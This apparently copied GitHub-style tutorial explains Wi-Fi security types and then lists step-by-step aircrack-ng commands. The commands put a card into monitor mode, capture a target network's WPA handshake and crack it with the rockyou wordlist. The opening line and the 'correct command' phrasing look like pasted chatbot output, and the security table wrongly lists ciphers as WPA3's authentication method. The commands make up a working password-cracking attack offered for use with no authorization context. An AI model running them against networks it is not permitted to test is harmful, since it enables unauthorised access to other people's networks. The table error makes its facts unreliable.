# Wifi_Hacking_Process

I appreciate your ethical approach! Cybersecurity knowledge should always be used for legal and ethical purposes—helping to secure systems, protect users, and educate others.

---
# What is Wifi?

Wi-Fi is wireless networking technology enabling various devices like computers, smartphones, and other equipment to connect to the Internet and communicate with each other without a cable. It creates a network where these devices can exchange information. These established connections through a wireless router act as an intermediary between the WiFi-compatible devices and the Internet. This technology allows seamless internet access and device communication in homes, offices, and in public spaces.


# Wi-Fi security types  
| Feature          | WEP (1997)             | WPA (2003)               | WPA2 (2004)              | WPA3 (2018)                         |
|-----------------|-----------------------|--------------------------|--------------------------|--------------------------------------|
| **Encryption**  | RC4                   | TKIP/RC4                 | AES-CCMP                 | AES-CCMP/AES-GCMP                   |
| **Session Key** | 64/128 bit             | 128 bit                  | 128 bit                  | 128/256 bit                         |
| **Authentication** | Open system, shared key | Pre-shared key          | Pre-shared key          | AES-CCMP/AES-GCMP                   |
| **Security Level** | Very Low             | Moderate                 | High                     | Very High                           |
| **Weakness**    | Insecure encryption, easily exploited by hackers | Low security | Weak encryption, compatibility issues |  complex deployment |



# COMMON WI-FI HACKING TECHNIQUES

1. Brute Force Attack - ( Password guess karne ka method)
2. WPS Attack - WPS button ka use karke network ko hack karna
3. Handshake Capture & Dictionary Attack
4. Evil Twin Attack - Fake Wi-fi netwrok setup

# Hacking method

1. **Starting Monitor Mode**  
   - Instead of `{ ifconfig wlan0 down }`, you should use:  
     ```bash
     sudo ifconfig wlan0 down
     ```  
   - Then, enable monitor mode correctly:  
     ```bash
     sudo airmon-ng start wlan0
     ```

2. **Scanning Nearby Networks**  
   - The correct command should be:  
     ```bash
     sudo airodump-ng wlan0mon
     ```

3. **Capturing the Handshake**  
   - Make sure to replace `<channel>` and `<MAC>` with actual values:  
     ```bash
     sudo airodump-ng -c <channel> --bssid <MAC> -w handshake wlan0mon
     ```

4. **Cracking the Handshake Using a Dictionary Attack**  
   - The correct command is:  
     ```bash
     sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <MAC> handshake.cap
     ```  
   - The correct location of **rockyou.txt** (after extraction) is:  
     ```bash
     /usr/share/wordlists/rockyou.txt
     ```
